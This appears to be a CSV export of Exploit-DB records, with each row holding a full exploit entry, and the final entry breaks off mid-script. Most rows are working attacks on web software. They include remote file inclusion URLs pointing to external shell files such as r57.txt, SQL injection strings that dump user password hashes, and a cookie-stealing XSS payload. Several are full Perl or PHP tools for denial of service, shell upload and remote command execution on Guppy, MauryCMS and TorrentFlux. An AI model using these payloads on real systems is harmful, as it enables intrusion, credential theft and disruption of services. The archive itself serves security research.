4333,"PHPNuke-Clan 4.2.0 - 'mvcw_conver.php' Remote File Inclusion                                   \#'#/                                   (-.-)    --------------------------oOO---(_)---OOo-------------------------    | PHPNuke-Clan <= v4.2.0 (mvcw_conver.php) Remote File Inclusion |    |                          coded by DNX                          |    ------------------------------------------------------------------ [!] Discovered: DNX [!] Vendor: http://www.phpnuke-clan.net [!] Detected: 11.08.2007 [!] Reported: 11.08.2007 [!] Remote: yes  [!] Background: PHPNuke-Clan is a clan management system based on PHP and MySQL  [!] Bug: $vwar_root in modules/vwar/convert/mvcw_conver.php  [!] PoC:     - http://[site]/[path]/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=[shell]  [!] Example:     - http://127.0.0.1/pnc/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http//127.0.0.1/shell.txt?  [!] Warning: ""step=1"" deletes all data from the tables vwar, vwar_opponents,     vwar_scores and vwar_screen in the database  [!] Solution: No update from vendor till now  [!] Quick fix in modules/vwar/convert/mvcw_conver.php line 79:     - replace: 	if ($GPC['step'] == 1) 	{ 		// clean tables      - with: 	if ($GPC['step'] == 1) 	{ 		$vwar_root = ""./../""; 		// clean tables  # milw0rm.com [2007-08-28]",remote,webapps,1
34250,"Joomla! Component Canteen 1.0 - Local File Inclusion source: https://www.securityfocus.com/bid/41358/info  The Miniwork Studio Canteen component for Joomla! is prone to an SQL-injection vulnerability and a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Attackers can exploit the SQL-injection vulnerability to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  An attacker can exploit the local file-include vulnerability using directory-traversal strings to view and execute arbitrary local files within the context of the webserver process. Information harvested may aid in further attacks.  Canteen 1.0 is vulnerable; other versions may also be affected.  http://www.example.com/index.php?option=com_canteen&controller=../../../../../etc/passwd%00",local,webapps,1
5621,"Kostenloses Linkmanagementscript - Remote File Inclusion ############################################ #   Remote File Inclusion Vulnerability    # #     Kostenloses Linkmanagementscript     #    ############################################         ## Author : HaCkeR_EgY   ## C0NTACT : hacker_egy@hotmail.com   ## H^OME : www.PAL-HaCkeR.com   &  ATSDP.COM   ## Scripte Name : Kostenloses Linkmanagementscript   ## download scripte :  http://scripte.phpway.de/   ## Downloads: 2458  ######################################################################## ================================================================================ ## VuRn C0DE :   Line 91 : <?php include($main_page_directory.$page_to_include); ?>   ## ExPL0!T :                 1=====>>http://www.target.de/script/template\index.php?main_page_directory=  Ev!L C0dE                 2=====>>http://www.target.de/script/template\index.php?page_to_include=  Ev!L C0dE   ## L!ve DeM0 :                       =======>>http://scripte.phpway.de/demo/template\index.php?page_to_include=http://captshino.tripod.com/r57.txt?     ################################################################################ [<>] Thanx : MY Brotha and MY Master "" Abo Mohamed ""   [<>] Greetz : Mr.SQL , Mohamed el Arab ,F!resell, DaRk MaStEr , H-T Team , Stack-Terrorist , str0ke   #################################################################################  # milw0rm.com [2008-05-14]",remote,webapps,1
6709,"Joomla! Component Joomtracker 1.01 - SQL Injection ################################################################  #       .___             __          _______       .___        #  #     __| _/____ _______|  | __ ____ \   _  \    __| _/____    #  #    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   #  #   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   #  #   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   #  #        \/                  \/             \/                 #  #                   ___________   ______  _  __                #  #                 _/ ___\_  __ \_/ __ \ \/ \/ /                #  #                 \  \___|  | \/\  ___/\     /                 #  #                  \___  >__|    \___  >\/\_/                  #  #      est.2007        \/            \/   forum.darkc0de.com   #  ################################################################  #  d3hydr8 - rsauron - baltazar - C1c4Tr1Z - beenu - P47tr1ck  #  #                  and all darkc0de  members                   #  ################################################################  #  # Author: rsauron  #  # Home  : www.darkc0de.com #  # Email : rsauron@gmail.com  #  # Share the c0de!  #  ################################################################  #  # Type: Joomla Component com_joomtracker Remote SQL Injection Vulnerability # # Title: Joomtracker XBT external bittorrent tracker # # Vendor: http://www.joomtracker.org/ #  ################################################################  # # d0rk: ""Powered by Joomtracker"" # ################################################################        POC :-  	 	index.php?option=com_joomtracker&task=tordetails&id=1/**/AND/**/1=2/**/UNION/**/SELECT/**/0,1,2,3,4,5,6,7,8,9,10,11,12,concat(username,0x3a,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35/**/from/**/jos_users/*                 Live Demo:  	 	http://www.joomtracker.org/index.php?option=com_joomtracker&task=tordetails&id=1/**/AND/**/1=2/**/UNION/**/SELECT/**/0,1,2,3,4,5,6,7,8,9,10,11,12,concat(username,0x3a,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35/**/from/**/jos_users/* 	 ################################################################  #  Bug discovered : 08 Oct.2008 ################################################################  # milw0rm.com [2008-10-09]",remote,webapps,1
1175,"GTChat 0.95 Alpha - 'adduser' Remote Denial of Service # Use a high user # for best results. /str0ke  #!/usr/bin/perl ###################### # codez0red by VTECin5th # # Feel free to modify/break this script # # Crappy code is more effective =] # # I accept no responsibility for misuse or abuse # ###################### # Usage: xxx.pl www.server.com /directory_to_chat/ #_of_users_to_create ###################### # Affected Software: GTChat .95 # Unaffected Software: GTChat .93 ###################### use IO::Socket; if (@ARGV < 2){ print ""Usage:\n xxx.pl www.server.com /Path_to_GTChat/ #_of_users_to_create\n""; print ""Example:\n xxx.pl www.serfer.com /GTChat/cgi-bin/ 5""; exit; } $dir = $ARGV[1]; $numero = $ARGV[2]; $host = $ARGV[0]; $host =~ s/http\:\/\///gi; for ($i = 1; $i <= $numero; $i++) { $rando = int(rand(234)); $randy = int(rand(12)); $whyThem = $randy . $rando . ""@"" . $randy . "".com""; $whyMe = ""SoSorry"" . $rando . $randy; $lol = ""$dir/chat.pl?action=register&name=$whyMe&password=$whyMe&password2=$whyMe&email=$whyThem&privateemail=0""; $ox=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>80,Proto=>'tcp') || die ""Oh No! You broke teh server!""; print $ox ""GET $lol HTTP/1.1\r\n""; print $ox ""Accept: */*\r\n""; print $ox ""Accept-Language: pt\r\n""; print $ox ""Accept-Encoding: gzip, deflate\r\n""; print $ox ""User-Agent: 1337 pwnz0r\r\n""; print $ox ""Host: $host\r\n""; print $ox ""Connection: Keep-Alive\r\n\r\n\r\n""; print ""currently on: $whyMe \t ($i)\n""; # Please note, this does not verify whether or not the user is actually being created. # I assume you know how to use this script. } print ""Finished creating $numero users""; close($ox);  # milw0rm.com [2005-08-23]",remote,dos,1
47119,"Android 7 - 9 VideoPlayer - 'ihevcd_parse_pps' Out-of-Bounds Write CVE-2019-2107 - looks scary. Still remember Stagefright and PNG bugs vulns .... With CVE-2019-2107 the decoder/codec runs under mediacodec user and with properly ""crafted"" video (with tiles enabled - ps_pps->i1_tiles_enabled_flag) you can possibly do RCE. The codec affected is HVEC (a.k.a H.265 and MPEG-H Part 2) #exploit #rce #android #stagefright #cve   More infos LineageOS (Android):  02-11 20:18:48.238   260   260 D FFmpegExtractor: ffmpeg detected media content as 'video/hevc' with confidence 0.08 02-11 20:18:48.239   260   260 I FFMPEG  : [hevc @ 0xb348f000] Invalid tile widths. 02-11 20:18:48.239   260   260 I FFMPEG  : [hevc @ 0xb348f000] PPS id out of range: 0 02-11 20:18:48.240   260   260 I FFMPEG  : [hevc @ 0xb348f000] Invalid tile widths. 02-11 20:18:48.240   260   260 I FFMPEG  : [hevc @ 0xb348f000] PPS id out of range: 0 02-11 20:18:48.240   260   260 I FFMPEG  : [hevc @ 0xb348f000] Error parsing NAL unit #5. 02-11 20:18:48.240   260   260 I FFMPEG  : [hevc @ 0xb348f000] Invalid tile widths. mplayer (laptop)  id: 0 [hevc @ 0x7f0bf58a7560]Decoding VPS [hevc @ 0x7f0bf58a7560]Main profile bitstream [hevc @ 0x7f0bf58a7560]Decoding SPS [hevc @ 0x7f0bf58a7560]Main profile bitstream [hevc @ 0x7f0bf58a7560]Decoding VUI [hevc @ 0x7f0bf58a7560]Decoding PPS [hevc @ 0x7f0bf58a7560]Invalid tile widths. [hevc @ 0x7f0bf58a7560]Decoding SEI [hevc @ 0x7f0bf58a7560]Skipped PREFIX SEI 5 [hevc @ 0x7f0bf58a7560]PPS id out of range: 0 [hevc @ 0x7f0bf58a7560]Error parsing NAL unit #5. Error while decoding frame! This stops it when the tile width is bigger than allowed: https://gitlab.freedesktop.org/gstreamer/meson-ports/ffmpeg/blob/ebf648d490448d511b5fe970d76040169e65ef74/libavcodec/hevc_ps.c#L1526  So the check are there.  On stock/google Andoird I think it will use libhevc, not ffmpeg, when using VideoPlayer.  https://www.droidviews.com/enjoy-hevc-h-265-video-playback-on-android/  I have the google codec:  OMX.google.hevc.decoder  I am wondering however why it does not crash ....  Attaching the video (videopoc.mp4) that should trigger this condition:  if (value >= ps_sps->i2_pic_wd_in_ctb - start) +                        { +                            return IHEVCD_INVALID_HEADER; +                        } Maybe somebody have more luck.  More infos 2 Whoooo hooo .... made it :)  Proof of concept is in hevc-crash-poc.mp4, other videos are for non andoird players.  Hvec-""fright"" is possible. You can own the mobile by viewing a video with payload. In my example I didn't include real payload.  07-13 21:50:59.000  3351  3351 I /system/bin/tombstoned: received crash request for pid 24089 07-13 21:50:59.006 24089 24089 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** 07-13 21:50:59.006 24089 24089 F DEBUG   : Build fingerprint: 'samsung/hero2ltexx/hero2lte:8.0.0/R16NW/G935FXXS4ESC3:user/release-keys' 07-13 21:50:59.006 24089 24089 F DEBUG   : Revision: '9' 07-13 21:50:59.006 24089 24089 F DEBUG   : ABI: 'arm64' 07-13 21:50:59.006 24089 24089 F DEBUG   : pid: 24089, tid: 24089, name: media.extractor  >>> mediaextractor <<< 07-13 21:50:59.006 24089 24089 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x7ccb800050 07-13 21:50:59.009 24089 24089 F DEBUG   :     x0   00000000ffffff36  x1   0000000000000000  x2   00000000000000f0  x3   0000000000000001 07-13 21:50:59.009 24089 24089 F DEBUG   :     x4   0000000000000001  x5   0000007ccb5df1b8  x6   0000007cc927363e  x7   0000007cc8e7bd04 07-13 21:50:59.009 24089 24089 F DEBUG   :     x8   0000000000004170  x9   0000000000004160  x10  00000000ffffffff  x11  0000007ccb7fbef0 07-13 21:50:59.010 24089 24089 F DEBUG   :     x12  0000007ccb5d3ce0  x13  000000000000001e  x14  0000000000000003  x15  0000000000000001 07-13 21:50:59.010 24089 24089 F DEBUG   :     x16  0000007cc99f5f50  x17  0000007ccb88885c  x18  0000007ccb566225  x19  0000007ccb562020 07-13 21:50:59.010 24089 24089 F DEBUG   :     x20  0000007ccb4f18a0  x21  0000007ccb468c6c  x22  0000000000000000  x23  0000000000000006 07-13 21:50:59.010 24089 24089 F DEBUG   :     x24  000000000000001e  x25  0000000000000094  x26  0000000000004160  x27  0000000000000001 07-13 21:50:59.010 24089 24089 F DEBUG   :     x28  0000007ccb55e750  x29  0000007fd6d39d90  x30  0000007cc99c4438 07-13 21:50:59.010 24089 24089 F DEBUG   :     sp   0000007fd6d39d20  pc   0000007cc99c44c4  pstate 0000000080000000 07-13 21:50:59.013 24089 24089 F DEBUG   :  --   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47119.zip",local,dos,0
7077,OTManager CMS 2.4 - 'Tipo' Remote File Inclusion -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=    OTManager 2.4 Remote File Inclusion (RFI) Vulnerability    - Security flaw discovered by Colt7r   - CONTACT: colt7r |@| bsdmail.org    - Affected Software: OTManager 2.4   - Risk: HIGH   - Exploit: http://host/Admin/ADM_Pagina.php?Tipo=[EVIL CODE]  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  # milw0rm.com [2008-11-10],remote,webapps,1
7162,"MauryCMS 0.53.2 - Arbitrary File Upload #!/usr/bin/perl   =about      MauryCMS <= 0.53.2 Remote Shell Upload Exploit    ----------------------------------------------    by athos - staker[at]hotmail[dot]it    download on http://cms.maury91.org    thnx Osirys     =cut   use strict; use warnings; use LWP::UserAgent;  my ($http,$post,$user,$pass,@auth,@read,$shell);  my $host = shift @ARGV; my $file = shift @ARGV or &usage;  open(FILE,$file) or die(""file error!\n"");  @read = <FILE>;  foreach(@read)  {   $shell .= $_; }  close(FILE);  &usage if $host !~ /http:\/\/(.+?)$/i && $file !~ /[a-zA-Z](\.php)/i;   my @path = split /\//,substr($host,7);   $http = new LWP::UserAgent(                             agent => ""Mozilla/4.5 [en] (Win95; U)"",                           );  @auth = split(':',get_cookies());  if(not defined($path[1])) {   $user = qq{_nick=${auth[1]}; path=/; };   $pass = qq{_sauth=${auth[0]}; path=/;}; } else {   $user = qq{/${path[1]}_nick=${auth[1]}; path=/; };   $pass = qq{/${path[1]}_sauth=${auth[0]}; path=/;}; }    $http->default_header('Cookie' => $user.$pass);  $post = $http->post($host.'/Admin.php',[                                          'zone'     => 'Modify',                                          'txtfname' => $file,                                          'txttext'  => $shell,                                        ]);                 if($post->is_success  && $post->as_string =~ /File Scritto/i) {   print STDOUT ""Exploit Successfully!\n"";   print STDOUT ""$host/$file\n"";   exit; } else {   print STDOUT ""Exploit Failed!\n"";   exit; }   sub get_cookies {   my ($query,$cookie,$content);    $query = ""/Rss.php?c=-1+union+select+1,concat(sauth,0x3a,nick),"".            ""3,4,5,6,7,8,9+from+mcms_users+where+id=1--"";                    $cookie = $http->get($host.$query);   $content = $cookie->content;     if($cookie->is_success & $content =~ /<title>(.+?)<\/title>/i)   {     return $1;   } }   sub usage {   print STDOUT ""MauryCMS <= 0.53.2 Remote Shell Upload Exploit\n"".                ""by athos - staker[at]hotmail[dot]it\n"".                ""----------------------------------------------\n"".                ""Usage: perl $0 http://[host] [name_shell.php]\n"".                ""Usage: perl $0 http://localhost/cms shell.php\n"";   exit; }  # milw0rm.com [2008-11-19]",remote,webapps,1
1342,"Guppy 4.5.9 - 'REMOTE_ADDR' Remote Command Execution <?php #  if magic_quotes_gpc is off you can inject arbitrary php code (from rgod) /str0ke #									       # #   ---guppy459_xpl.php                                   17.30 28/11/2005     # #                                                                              # #    Guppy <=4.5.9 _SERVER[REMOTE_ADDR] overwrite / remote commands xctn       # #                              coded by rgod                                   # #                    site: http://rgod.altervista.org                          # #                                                                              # #  usage: launch from Apache, fill in requested fields, then go!               # #                                                                              # #  Sun-Tzu:""To lift an autumn hair is no sign of great strength; to see the    # #  sun and moon is no sign of sharp sight; to hear the noise of thunder is     # #  no sign of a quick ear.""                                                    #  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"", 2); ob_implicit_flush (1);  echo'<html><head><title> ******** Guppy <=4.5.9  remote commands xctn ********** </title><meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1""> <style type=""text/css""> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img {background-color:   #FFFFFF   !important}  input  {background-color:    #303030 !important} option {  background-color:   #303030   !important}         textarea {background-color: #303030 !important} input {color: #1CB081 !important}  option {color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox {background-color: #303030 !important} select {font-weight: normal;       color: #1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important; background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size: 0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em !important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em !important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em !important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style: normal !important} *{text-decoration: none !important} a:link,a:active,a:visited { text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline; color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-weight:bold; font-style: italic;}--></style></head><body><p class=""Stile6"">  ******** Guppy <=4.5.9  remote commands xctn **********</p><p class=""Stile6"">a script  by  rgod  at        <a href=""http://rgod.altervista.org""target=""_blank""> http://rgod.altervista.org</a></p><table width=""84%""><tr><td width=""43%"">  <form name=""form1"" method=""post""  action=""'.strip_tags($SERVER[PHP_SELF]).'""><p><input type=""text""  name=""host""> <span class=""Stile5"">* hostname (ex:www.sitename.com) </span></p> <p><input type=""text"" name=""path"">  <span class=""Stile5"">* path (ex: /guppy/  or just / ) </span></p><p><input type=""text"" name=""command"">      <span class=""Stile5""> * specify a command , ""cat ./admin/mdp.php"" to  see       master database MD5 password hash( against  windows: type .\admin\mdp.php) </span> </p> <p> <input type=""text"" name=""port""><span class=""Stile5"">specify  a  port   other than  80 ( default  value ) </span></p> <p>  <input  type=""text""   name=""proxy""> <span class=""Stile5"">  send  exploit through an  HTTP proxy (ip:port)</span></p> <p><input type=""submit"" name=""Submit"" value=""go!""></p></form> </td></tr></table> </body></html>';   function show($headeri) { $ii=0; $ji=0; $ki=0; $ci=0; echo '<table border=""0""><tr>'; while ($ii <= strlen($headeri)-1) { $datai=dechex(ord($headeri[$ii])); if ($ji==16) {              $ji=0;              $ci++;              echo ""<td>&nbsp;&nbsp;</td>"";              for ($li=0; $li<=15; $li++)                       { echo ""<td>"".$headeri[$li+$ki].""</td>""; 			    }             $ki=$ki+16;             echo ""</tr><tr>"";             } if (strlen($datai)==1) {echo ""<td>0"".$datai.""</td>"";} else {echo ""<td>"".$datai.""</td> "";} $ii++; $ji++; } for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)                       { echo ""<td>&nbsp&nbsp</td>"";                        }  for ($li=$ci*16; $li<=strlen($headeri); $li++)                       { echo ""<td>"".$headeri[$li].""</td>""; 			    } echo ""</tr></table>""; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';  function sendpacket() //if you have sockets module loaded, 2x speed! if not,load 		              //next function to send packets {   global $proxy, $host, $port, $packet, $html, $proxy_regex;   $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);   if ($socket < 0) {                    echo ""socket_create() failed: reason: "" . socket_strerror($socket) . ""<br>"";                    } 	      else  		  {   $c = preg_match($proxy_regex,$proxy);               if (!$c) {echo 'Not a valid prozy...';                         die;                        }                     echo ""OK.<br>"";                     echo ""Attempting to connect to "".$host."" on port "".$port.""...<br>"";                     if ($proxy=='') 		   { 		     $result = socket_connect($socket, $host, $port); 		   } 		   else 		   {  		   $parts =explode(':',$proxy);                    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>'; 		   $result = socket_connect($socket, $parts[0],$parts[1]); 		   } 		   if ($result < 0) {                                      echo ""socket_connect() failed.\r\nReason: ("".$result."") "" . socket_strerror($result) . ""<br><br>"";                                     } 	                       else 		                    {                                      echo ""OK.<br><br>"";                                      $html= '';                                      socket_write($socket, $packet, strlen($packet));                                      echo ""Reading response:<br>"";                                      while ($out= socket_read($socket, 2048)) {$html.=$out;}                                      echo nl2br(htmlentities($html));                                      echo ""Closing socket..."";                                      socket_close($socket);  				    }                   } } function sendpacketii($packet) { global $proxy, $host, $port, $html, $proxy_regex; if ($proxy=='')       {$ock=fsockopen(gethostbyname($host),$port);        if (!$ock) { echo 'No response from '.htmlentities($host); 			die; }       }              else            { 	   $c = preg_match($proxy_regex,$proxy);               if (!$c) {echo 'Not a valid prozy...';                         die;                        } 	   $parts=explode(':',$proxy); 	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>'; 	    $ock=fsockopen($parts[0],$parts[1]); 	    if (!$ock) { echo 'No response from proxy...'; 			die; 		       } 	   } fputs($ock,$packet); if ($proxy=='')   {      $html='';     while (!feof($ock))       {         $html.=fgets($ock);       }   } else   {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))     {       $html.=fread($ock,1);     }   } fclose($ock); echo nl2br(htmlentities($html)); } $host=$_POST[host];$path=$_POST[path]; $port=$_POST[port];$command=$_POST[command]; $proxy=$_POST[proxy];  if (($host<>'') and ($path<>'') and ($command<>'')) { $port=intval(trim($port)); if ($port=='') {$port=80;} if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;} $host=str_replace(""\r\n"","""",$host); $path=str_replace(""\r\n"","""",$path);  #STEP 1 -> inject command... $CODE='"";error_reporting(0);ini_set(""max_execution_time"",0);system(""'.$command.'>SUNTZU"");echo""'; $CODE=urlencode($CODE); $packet=""GET "".$p.""error.php?err=suntzu&_SERVER=&_SERVER[REMOTE_ADDR]="".$CODE."" HTTP/1.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Accept-Encoding: text/plain\r\n""; $packet.=""User-Agent: Googlebot/Test (+http://www.googlebot.com/bot.html)\r\n""; $packet.=""Connection: Close\r\n\r\n""; show($packet); sendpacketii($packet); #now you will be redirected to an error description page, we need to see this #url to include/execute error file... $temp=explode('location: ',$html); $temp2=explode(chr(0x0d).chr(0x0a),$temp[1]); $location=$temp2[0]; echo ""Location ->"".htmlentities($location).""<br>"";  #STEP 2 -> Launch commands... $packet=""GET "".$p.$location."" HTTP/1.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Accept-Encoding: text/plain\r\n""; $packet.=""User-Agent: Internet Ninja x.0\r\n""; $packet.=""Connection: Close\r\n\r\n""; show($packet); sendpacketii($packet);  #STEP 3 -> lookin' for redirected output... $packet=""GET "".$p.""SUNTZU HTTP/1.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Accept-Encoding: text/plain\r\n""; $packet.=""User-Agent: Kenjin Spider\r\n""; $packet.=""Connection: Close\r\n\r\n""; show($packet); sendpacketii($packet); }  ?>  # milw0rm.com [2005-11-28]",remote,webapps,1
30651,Joomla! Component WebMaster-Tips.net Joomla! RSS Feed Reader 1.0 - Remote File Inclusion source: https://www.securityfocus.com/bid/25999/info  Webmaster-Tips.net Joomla! RSS Feed Reader is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied input.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/path/administrator/components/com_wmtrssreader/admin.wmtrssreader.php?mosConfig_live_site=sh3ll?,remote,webapps,1
5286,"ASPapp Knowledge Base - SQL Injection ..##.....##      ...##...##       ....##.## .....###CoRPITX  .....###      ....##.## ...##...## ..##.....##  -------------------------Turkey------------------------------                                                 -----------------www.Hayalet-hack.com------------------------  -----------------www.xcorpitx-hack.com-----------------------  ASPapp KnowledgeBase (content_by_cat.asp?catid) SQL Injection Vulnerability  -------------------------------------------------------------  ------- Dork 1 -  content_by_cat.asp?contentid ''catid''   Dork 2 -  content_by_cat.asp? ''catid''   ------- exploit- -------  ------------------------------------------------------------- content_by_cat.asp?contentid=99999999&catid=-99887766+UNION+SELECT+0,null,password,3,accesslevel,5,null,7,null,user_name+from+users -------------------------------------------------------------  ------------------------------------------------------------- content_by_cat.asp?contentid=-99999999&catid=-99887766+union+select+0,null,password,3,accesslevel,5,null,7,8,user_name+from+users -------------------------------------------------------------  thanx- str0ke-D3ng3siz-pc faresi-s@bun-Hayalet-Turque-  # milw0rm.com [2008-03-20]",remote,webapps,1
31147,"Adult WebMaster PHP - Password Disclosure ########################################################################## [+] Exploit:Adult Webmaster PHP - Password Disclosure                    # [+] Author: vinicius777					                 # [+] Email/Twitter: vinicius777 [AT] gmail  @vinicius777_                 #	                  [+] Vendor Homepage: http://sourceforge.net/projects/adultweb/  	 # ##########################################################################    [1] Administrative Credential Disclosure  PoC:   root@kali:/# curl http://localhost/home/caspers/public_html/demo/admin/userpwdadfasdfre.txt  admin:3a4ebf16a4795ad258e5408bae7be341  #  Vulnerable Code: [+] admin/common.php          // Check user existance          $pfile = fopen(""userpwdadfasdfre.txt"",""a+"");     rewind($pfile);      while (!feof($pfile)) {         $line = fgets($pfile);         $tmp = explode(':', $line);         if ($tmp[0] == $user) {             $errorText = ""The selected user name is taken!"";             break;         }     }      // If everything is OK -> store user data     if ($errorText == ''){                 // Secure password string                 $userpass = md5($pass1);                  fwrite($pfile, ""\r\n$user:$userpass"");     }      fclose($pfile);    # # # Greetz to g0tm1lk and TheColonial.",remote,webapps,1
24680,"FuseTalk Forum 4.0 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/11407/info  FuseTalk Forum is reported prone to multiple input validation vulnerabilities. These issues may allow a remote attacker to carry out cross-site scripting attacks. The cause of these issues is insufficient sanitization of user-supplied data.  The first issue is reported to exist because the software echoes unsanitized request data as part of an error page to the origin of the request. This makes it possible for an attacker to a construct a malicious link containing HTML or script code, the attacker-supplied code will be rendered as part of an error message if a target user follows the malicious URI link.  FuseTalk Forum is reported prone to an additional cross-site scripting vulnerability.  The problem presents itself when malicious HTML and script code is sent to the 'tombstone.cfm' script through a URI parameter.  This may allow for theft of cookie-based authentication credentials or other attacks.  www.example.com\tombstone.cfm?ProfileID=<script>alert(document.cookie)</script>",remote,webapps,1
40631,"Boonex Dolphin 7.3.2 - Authentication Bypass # Exploit Title     : Boonex Dolphin all versoin <= 7.3 Authentication Bypass # Exploit Author    : Saadat Ullah saadi_linux[@]rocketmail.com # Software Link     : https://www.boonex.com # Author HomePage   : http://security-geeks.blogspot.com    Proof of Concept  File: admin.inc.php Line: 187 Code: (strcmp($aProfile['Password'], $passwd) != 0)   $passwd is equal to Cookie parameter memberpassword   Bug: According to PHP documentation strcmp will compare strings, but what if we provide an array???   So, simple bypass is to put two cookies in browser memberID=1 memberPassword[]=blah --->array   This will allow the attacker to bypass the authentication and can also enter in admin panel.   #Independent Pakistani Security Researcher",remote,webapps,1
2902,"TorrentFlux 2.2 - 'downloaddetails.php' Local File Disclosure #Description:   #TorrentFlux fails to sanitise the variable ""alias"" in downloaddetails.php. This allows an  #attacker to include any file they want; the contents is displayed at in the spaces provided #and the remaning data is displayed as error messages on the page. Overall Torrentflux makes it #look quite nice. Solution use SecurityClean() of viewnfo.php to solve the problem.   # Note: After just looking at the code for viewnfo.php of TorrentFlux 2.1, it would seem that # it is possible to also read the config.php file in the same way, since path was not sanitised.  # Although they have fixed this problem in 2.2 with a function i demonstrated to the  # developer for a previous vulnerability. Exploit: viewnfo.php?path=../config.php  # Just a thought, SecurityCleanPath() could look a bit nicer like so:  # From:  #if( (strtolower( substr( $string, -4 ) ) == "".txt"") || (strtolower( substr( $string, -4 ) ) == "".nfo"") ) #    { #        // we are good #    } #    else #    { #        AuditAction($cfg[""constants""][""error""], ""Not a text or NFO: "" . $string); #        die(""Invalid file specified.  Action has been logged.""); #    }  #To:  #if( (strtolower( substr( $string, -4 ) ) != "".txt"") || (strtolower( substr( $string, -4 ) ) != "".nfo"") ) #{ #	AuditAction($cfg[""constants""][""error""], ""Not a text or NFO: "" . $string); #	die(""Invalid file specified.  Action has been logged.""); #} # And it would seem for some reason if you do you change the above code it prevents you from  # using a null character to access any file in the current or above directory. 2.2 is  # vulnerable to this. EG: viewnfo.php?path=../config.php%00.txt (but since you cant go back # a directory it doesn't help much - and you are stuck in the downloads, or above directories).   # r0ut3r (writ3r [at] gmail.com)  ################################################################################################# #                                    r0ut3r Presents...                                         # #                                                                                               # #                                Another r0ut3r discovery!                                      # #                                  writ3r [at] gmail.com                                        # #                                                                                               # #                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       # ################################################################################################# # Software: TorrentFlux 2.2                                                                     # #                                                                                               # # Vendor: http://www.torrentflux.com/                                                           # #                                                                                               # # Released: 2006/12/09                                                                          # #                                                                                               # # Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       # #                                                                                               # # Note from a developer: ""Valid TorrentFlux user IDs are REQUIRED and this is NOT an open       # # vulnerability to a NON user"".                                                                 # #                                                                                               # # Note: The information provided in this document is for TorrentFlux administrator              # # testing purposes only! This vulnerability requires a user account.                            # #                                                                                               # # Apart from a few problems (which are fixed) TorrentFlux is a great torrent client.            # # Download it at: http://www.torrentflux.com/                                                   # #################################################################################################  use IO::Socket;  $port = ""80""; # connection port $target = @ARGV[0]; # torrentflux.com $folder = @ARGV[1]; # /torrentflux/ $user = @ARGV[2]; # login username $pass = @ARGV[3]; # login password  sub Header() { 	print q 	{################################################################################################# #                                    r0ut3r Presents...                                         # #                                                                                               # #                                Another r0ut3r discovery!                                      # #                                  writ3r [at] gmail.com                                        # #                                                                                               # #                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       # ################################################################################################# }; }  sub Usage() { 	print q 	{ Usage: db_tf2.pl [target] [directory] [username] [password] Example: db_tf2.pl torrentflux.com /torrentflux/ r0ut3r testing123  }; 	exit(); }  Header();  if (!$target || !$folder || !$user || !$pass) { 	Usage(); }  print ""\n[+] Connecting...\r\n""; $sock = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => $target, PeerPort => $port) || die ""[-] Failed to connect. Exiting...\r\n""; print ""[+] Attempting to login\n""; print $sock ""GET "".$folder.""login.php?username=$user&iamhim=$pass HTTP/1.1\n""; print $sock ""Host: $target\n""; print $sock ""User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n""; print $sock ""Accept: text/html\n""; print $sock ""Connection: keep-alive\n\n\r\n"";  while (<$sock>) {         if (/Cookie: TorrentFlux=(.*?);/)         {                 $cookie = ""TorrentFlux=$1"";         } }  print ""[+] Successfully logged in\n""; print ""[+] 